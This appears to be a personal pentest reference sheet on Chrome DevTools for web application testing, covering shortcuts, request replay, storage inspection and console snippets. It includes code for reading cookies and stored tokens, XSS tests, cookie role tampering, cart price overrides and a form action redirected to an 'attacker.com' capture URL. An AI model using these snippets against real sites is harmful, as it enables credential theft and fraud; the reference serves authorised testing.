---
tags: [reference, browser, devtools, web-testing, javascript]
---

# Chrome DevTools — Pentest Reference

## Open DevTools

| Shortcut | Action |
|----------|--------|
| `F12` | Open DevTools |
| `Ctrl+Shift+I` | Open DevTools |
| `Ctrl+Shift+J` | Open Console |
| `Ctrl+Shift+C` | Inspect element |
| `Ctrl+Shift+M` | Toggle device toolbar (mobile emulation) |
| `Ctrl+P` | Open file (search source files) |

## Network Tab — Intercept Requests

1. Open DevTools → **Network** tab
2. Reload page — all requests appear
3. Right-click request → **Copy → Copy as cURL** (paste directly in terminal)
4. Click request → **Headers/Payload/Response**
5. **Preserve log** — keeps history across redirects
6. Filter: `XHR` for API calls, `Doc` for pages, `WS` for WebSockets

### Replay/Modify Requests
```
Right-click request → "Copy as fetch" → paste in Console → modify and run
```

## Console — JavaScript Execution

```javascript
// Cookie access (test HttpOnly)
document.cookie

// LocalStorage / SessionStorage (JWT tokens, creds)
localStorage.getItem('token')
sessionStorage.getItem('user')
JSON.stringify(localStorage)

// All localStorage keys
Object.keys(localStorage).forEach(k => console.log(k, localStorage[k]))

// DOM XSS test
eval("alert(1)")
document.write("<script>alert(1)<\/script>")

// CSRF token extraction
document.querySelector('[name="csrf_token"]').value
document.querySelector('input[name="_token"]').value

// Send request with credentials
fetch('/api/admin', {credentials: 'include'}).then(r=>r.text()).then(console.log)

// Override function (bypass client-side check)
window.isAdmin = function() { return true; }

// Read response body
fetch('/api/secret').then(r=>r.json()).then(console.log)
```

## Application Tab — Storage Inspection

- **Cookies**: View/edit/delete cookies — check HttpOnly, Secure, SameSite flags
- **LocalStorage**: Auth tokens, user data
- **SessionStorage**: Session-scoped data
- **IndexedDB**: Client-side database
- **Service Workers**: Check for caching logic that can be abused

```javascript
// Delete all cookies (test auth)
document.cookie.split(';').forEach(c => {
  document.cookie = c.trim().split('=')[0] + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC'
})

// Modify cookie value
document.cookie = "role=admin; path=/"
```

## Sources Tab — JavaScript Analysis

- Find interesting endpoints, API keys, tokens hardcoded in JS
- **Pretty print** minified JS: `{}` button at bottom
- **Search all files**: `Ctrl+Shift+F` — search "api_key", "password", "secret", "token"

```
Ctrl+Shift+F → search: "api_key"
Ctrl+Shift+F → search: "Authorization"
Ctrl+Shift+F → search: "/api/admin"
```

## Security Tab

- View TLS certificate details
- Check for mixed content warnings
- Identify certificate CN/SANs (useful for vhost discovery)

## Bypass Client-Side Controls

```javascript
// Remove input maxlength restriction
document.querySelector('input').removeAttribute('maxlength')

// Enable disabled form field
document.querySelector('input[disabled]').removeAttribute('disabled')

// Remove hidden field
document.querySelector('input[type="hidden"]').type = 'text'

// Change form action
document.querySelector('form').action = 'http://attacker.com/capture'

// Override price (client-side cart manipulation)
document.querySelector('[name="price"]').value = '0.01'

// Bypass JS-based file type check (upload)
// Use Burp to intercept after browser accepts → change Content-Type manually
```

## WebSocket Testing

1. Network tab → filter **WS**
2. Click WS connection → **Messages** tab
3. All sent/received messages visible
4. Use **wscat** for CLI testing:

```bash
npm install -g wscat
wscat -c ws://<target>/ws
# Then type messages manually
wscat -c "ws://<target>/chat" --header "Authorization: Bearer <token>"
```

## CORS Testing via Console

```javascript
// Test CORS misconfiguration
fetch('http://<target>/api/user', {
  credentials: 'include',
  headers: {'Origin': 'https://evil.com'}
}).then(r => r.text()).then(console.log)

// Check response headers in Network tab for:
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Origin: null
// Access-Control-Allow-Credentials: true
```

## Related

- [[07-Web-Application/XSS-SSRF-XXE-IDOR]] — XSS/CORS exploitation
- [[05-Exploitation/Web-Apps]] — Web exploitation
- [[00-Reference/XSS-Payloads]] — XSS payload reference
